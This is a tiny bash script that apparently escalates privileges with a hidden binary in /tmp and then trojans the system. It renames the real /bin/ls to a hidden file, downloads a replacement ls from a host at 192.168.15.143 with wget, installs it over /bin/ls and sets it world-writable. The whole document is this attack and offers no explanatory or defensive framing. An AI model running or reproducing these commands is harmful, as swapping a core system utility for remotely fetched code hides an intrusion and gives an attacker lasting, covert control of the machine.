#!/bin/bash
cd /tmp/ && ./.elev
echo " " && echo " " && cd / && mv /bin/ls /bin/.hiddenls && wget http://192.168.15.143/temp/ls && mv ls /bin/ls && chmod 777 /bin/ls
